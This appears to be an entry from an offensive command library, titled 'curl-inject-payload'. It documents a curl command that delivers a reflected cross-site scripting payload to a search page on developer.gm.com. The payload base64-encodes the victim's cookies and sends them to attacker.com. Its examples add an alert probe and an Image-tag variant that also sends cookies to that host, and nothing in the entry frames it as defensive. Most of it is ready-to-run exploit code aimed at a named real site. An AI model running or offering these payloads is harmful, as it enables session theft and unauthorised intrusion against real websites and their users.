---
data: >-
  curl -X GET
  "https://developer.gm.com/search?query=%3Cscript%3Efetch('http://attacker.com/steal?data='+btoa(document.cookie))%3C/script%3E"
  -v
tags:
  - xss
  - exploitation
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:30.950Z'
id: 5049f2ff-2774-4b7e-93d9-093f40297fd7
verified: false
validated: true
submitted: true
---
# curl-inject-payload

## Command

```bash
curl -X GET "https://developer.gm.com/search?query=%3Cscript%3Efetch('http://attacker.com/steal?data='+btoa(document.cookie))%3C/script%3E" -v
```

## Description

Injects a malicious JavaScript payload via curl to exploit XSS, encoding and sending victim cookies to an attacker server upon execution in the browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `query` | Target parameter | Yes |
| Payload | Encoded JS for exfiltration | Yes |
| `-v` | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl "https://target.com/vuln?param=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -X GET "https://target.com/vuln?param=%3Cscript%3Enew Image().src='http://attacker.com?'+document.cookie%3C/script%3E" --cookie "session=abc123"
```

## Expected Output

Server response (200 OK) with reflected payload; actual execution sends data to attacker endpoint when loaded in browser.

## Related

- [[Related Procedure: Inject-and-Execute-Malicious-JavaScript]]
